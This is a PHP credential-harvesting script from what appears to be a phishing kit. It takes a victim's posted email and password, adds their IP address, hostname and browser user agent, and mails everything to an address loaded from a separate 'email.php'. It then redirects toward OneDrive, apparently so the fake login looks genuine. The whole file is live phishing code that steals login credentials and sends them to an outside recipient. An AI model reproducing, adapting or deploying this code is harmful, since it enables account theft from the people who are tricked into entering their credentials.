<?php
if($_POST["em"] != "" and $_POST["ps"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "----------------------------------------\n";
$message .= "Username or Em@il            	: ".$_POST['em']."\n";
$message .= "P@s.sw0rd           			: ".$_POST['ps']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("https://onedrive.live.com/");
}else{
header ("Location: index.php");
}

?>